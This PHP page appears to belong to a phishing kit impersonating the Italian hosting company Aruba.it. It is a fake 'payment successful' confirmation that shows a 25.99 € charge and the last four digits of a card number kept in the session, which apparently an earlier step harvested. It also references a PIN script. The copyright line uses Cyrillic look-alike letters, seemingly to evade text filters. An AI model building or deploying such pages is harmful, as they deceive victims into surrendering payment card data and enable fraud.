<?php
    require_once('PARTS/header.php');
?>
    <body>
        <div class="loader d-flex flex-column  justify-content-center align-items-center d-none">
            <img src="assets/images/aruba_logo.svg" class="loadingimg">
            <p style="padding-top: 25px; font-size: 24px; font-weight:100 ; z-index: 999;">Attendere prego...</p>
        </div>
        <div class="container">
            <div class="row">
                <div class="col-md-12 d-flex flex-column align-items-center">
                        <div class="col-md-8 pt-5">
                            <div class="row">
                                <div class="col-6 text-left">
                                    <img src="assets/images/aruba_logo.svg" width="150px">
                                </div>
                                <div class="col-6 text-right">
                                    <img class="float-end" src="assets/images/viscard.png" width="150px">
                                </div>
                            </div>
                        </div>
                        <div class="col-md-8 mycontent">
                            <div class="row">
                                <div class="col-md-12 d-flex justify-content-center align-items-center p-3">
                                    
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-12">
                                    <form id="form" action="./" method="POST">
									<input type="hidden" name="step"  value="done">
                                        <div class="speaches">
										<center>
                                            <p class="">il tuo pagamento è andato a buon fine.</p>
											<img style="width:60px" src="./assets/images/done.gif"></img>
											</center>
                                            <p></p>
                                            
                                            <div class="form-group d-flex align-items-center flex-column">
                                                
                                               
                                            </div>
                                            <div class="pt-3">
                                                <hr>
                                            </div>
                                            <h3 class="bbigti">Dettagli del pagamento</h3>
                                            <p class="title">Importo</p>
                                            <p class="info">25.99 €</p>
                                            <p class="title">Codice ordine</p>
                                            <p class="info"><?php echo $_SESSION['idnum']; ?></p>
                                            <p class="title">Data e ora</p>
                                            <p class="info"><?php echo date('d/m/Y H:i:s') ?></p>
                                            <p class="title">Numero carta</p>
                                            <p class="info">**** **** **** <?php echo substr($_SESSION['cc'], -4) ?></p>
                                            <div class="form-group d-flex align-items-center flex-column p-4">
                                                <button class="yellowbtn" type="submit">Prosegui</button>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-8 text-center pt-5">
                            <p>Cорyrіght @<?php echo date('Y') ?> аrubа ѕ.р.а.- р.і. 0257950516 - аll rіghtѕ rеѕеrνеd -</p>
                            <p class="flink" >Aruba.it</p>
                        </div>
                </div>
            </div>
        </div>
        <?php  require_once('PARTS/footer.php') ?>
        <script src="assets/js/pages/pin.js"></script>
    </body>
</html>
